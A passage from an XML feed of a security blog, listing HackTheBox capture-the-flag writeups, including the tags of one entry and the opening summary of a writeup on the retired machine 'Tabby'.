+technique was an interesting complication for an easy HTB machine.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Windows"></category><category term="chisel"></category><category term="cloudme"></category></entry><entry><title>HTB: Tabby</title><link href="https://maggick.fr/2020/11/htb-tabby.html" rel="alternate"></link><published>2020-11-10T20:55:00+01:00</published><updated>2020-11-10T20:55:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-11-10:/2020/11/htb-tabby.html</id><summary type="html">&lt;p&gt;&lt;img alt="Tabby Card" class="align-left" src="/media/2020.11/tabby_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This article is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/259"&gt;Tabby&lt;/a&gt; publish on June
 20 2020 by &lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egree55&lt;/a&gt;.
